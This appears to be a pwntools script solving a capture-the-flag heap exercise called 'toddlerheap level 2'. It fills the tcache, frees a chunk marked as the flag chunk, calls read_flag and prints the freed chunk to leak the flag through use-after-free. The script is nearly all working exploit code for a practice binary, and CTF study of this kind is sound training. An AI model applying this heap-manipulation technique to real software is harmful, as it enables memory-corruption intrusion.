#!/usr/bin/env python3

from pwn import *

binary = './toddlerheap_level2.0_patched'

p = process(binary)

s = '''
b malloc
b free
'''

for i in range(7):
	p.sendline(f"malloc {i} 75")


	
for i in range(7):
	p.sendline(f"free {i}")



p.sendline(f"calloc 8 75") 
p.sendline(f"calloc 9 1044")


p.sendline(f"calloc 10 1044") # guarding


p.sendline(f"calloc 12 75") 
p.sendline(f"calloc 13 1044")


p.sendline(f"calloc 14 1044") # guarding



p.sendline(f"free 9")


p.sendline(f"free 13")










p.sendline(f"free 8")
p.sendline(f"free 12") # flag chunk

gdb.attach(p, s)
p.sendline(f"read_flag")





p.sendline("puts 12")



p.interactive()
